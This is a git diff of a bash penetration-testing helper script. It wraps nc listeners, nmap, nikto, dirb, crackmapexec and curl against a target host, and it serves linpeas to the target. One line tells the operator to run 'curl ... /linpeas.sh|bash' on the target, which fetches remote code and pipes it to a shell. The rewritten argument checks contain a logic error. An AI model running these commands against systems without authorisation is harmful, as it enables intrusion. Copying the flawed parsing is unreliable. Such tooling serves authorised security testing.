@@ -22,8 +22,7 @@ show_help() {
 }
 
 getIP() {
-  # This is pretty poor code. Sry, not sry :P
-  if [ -n "$(ip a | grep "tun0")" ]; then
+  if ip a | grep -q "tun0"; then
     DEV="tun0"
   else
     DEV="eth0"
@@ -77,7 +76,8 @@ fi
 # Load RHOST
 FILE="/dev/shm/.fxy/rhost"
 if [ -f $FILE ]; then
-  export RHOST="$(cat $FILE)"
+  RHOST="$(cat $FILE)"
+  export RHOST
 
   if [ -z "$RHOST" ]; then
      echo "Something went wrong on loading '$FILE'"
@@ -108,7 +108,7 @@ if [ "$1" == "httpd" ] || [ "$1" == "www" ] ; then
   exit
 fi
 
-## l|isten [port]\t\t\t\t: nc -vlp PORT
+## l|isten [port]\t\t\t\t: nc -vlkp PORT
 if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   CMD="nc -vlkp"
   if [ "$#" -eq 2 ]; then
@@ -135,9 +135,26 @@ if [ "$1" == "n" ] || [ "$1" == "nmap" ]; then
   exit
 fi
 
-## nikto\t\t\t\t\t: nikto -host RHOST | tee
+## nikto [s|ssl|tls] [SUBDIR]\t\t: nikto -host RHOST+SUBDIR | tee
 if [ "$1" == "nikto" ]; then
-  CMD="nikto -host $RHOST | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  CMD="nikto -host"
+  PROTO="http"
+  SUBDIR="/"
+  # more than 1 arg?
+  if [ "$#" -ge 2 ]; then
+    # is it https?
+    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
+      PROTO="https"
+    fi
+
+    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
+      SUBDIR="$3"
+    elif [ "$#" -eq 2 ] && { [ "$2" != "s" ] || [ ! "$2" != "ssl" ] || [ ! "$2" != "tls" ]; }; then
+      SUBDIR="$2"
+    fi
+  fi
+
+  CMD="$CMD $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
@@ -159,55 +176,52 @@ if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
   exit
 fi
 
-## dirb [s|https|ssl|tls] [SUBDIR]\t\t: dirb PROTO://RHOST/SUBDIR | tee
+## dirb [s|ssl|tls] [SUBDIR]\t\t\t: dirb PROTO://RHOST/SUBDIR | tee
 if [ "$1" == "dirb" ]; then
   CMD="dirb"
-  if [ "$#" -eq 2 ]; then
-    if [ "$2" == "s" ] || [ "$2" == "https" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ] ; then
+  PROTO="http"
+  SUBDIR="/"
+  # more than 1 arg?
+  if [ "$#" -ge 2 ]; then
+    # is it https?
+    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
       PROTO="https"
     fi
-  else
-    PROTO="http"
+
+    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
+      SUBDIR="$3"
+    elif [ "$#" -eq 2 ] && { [ "$2" != "s" ] || [ ! "$2" != "ssl" ] || [ ! "$2" != "tls" ]; }; then
+      SUBDIR="$2"
+    fi
   fi
 
-  SUBDIR=""
-  if [ "$#" -eq 3 ]; then
-    SUBDIR="$3"
-  fi
-
-  CMD="$CMD $PROTO://$RHOST/$SUBDIR/ | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  CMD="$CMD $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
   exit
 fi
 
-## curl [SUBDIR]\t\t\t\t: curl -si http://RHOST/SUBDIR | less
+## curl [s|ssl|tls] [SUBDIR]\t\t\t\t: curl -si PROTO://RHOST+SUBDIR | less
 if [ "$1" == "curl" ]; then
-  CMD="curl -si"
-
-  SUBDIR=""
-  if [ "$#" -eq 2 ]; then
-    SUBDIR="$2"
-  fi
-
-  CMD="$CMD http://${RHOST}${SUBDIR} | less"
-  echo "> $CMD"
-  prompt
-  bash -c "$CMD"
-  exit
-fi
-
-## curls [SUBDIR]\t\t\t\t: curl -ski https://RHOST/SUBDIR | less
-if [ "$1" == "curls" ]; then
   CMD="curl -ski"
+  PROTO="http"
+  SUBDIR="/"
+  # more than 1 arg?
+  if [ "$#" -ge 2 ]; then
+    # is it https?
+    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
+      PROTO="https"
+    fi
 
-  SUBDIR=""
-  if [ "$#" -eq 2 ]; then
-    SUBDIR="$2"
+    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
+      SUBDIR="$3"
+    elif [ "$#" -eq 2 ] && { [ "$2" != "s" ] || [ ! "$2" != "ssl" ] || [ ! "$2" != "tls" ]; }; then
+      SUBDIR="$2"
+    fi
   fi
 
-  CMD="$CMD https://${RHOST}${SUBDIR} | less"
+  CMD="$CMD $PROTO://${RHOST}${SUBDIR} | less"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
@@ -296,7 +310,7 @@ if [ "$1" == "linpeas" ]; then
   CMD="python3 -m http.server $PORT"
   echo "$(tput bold)Run this on your target:"
   echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_"'$(whoami).log'
-  echo "$(tput sgr0)"
+  echo "$(tput sgr0) "
   echo "> $CMD"
   bash -c "$CMD"
   rm "$FPATH/linpeas.sh"
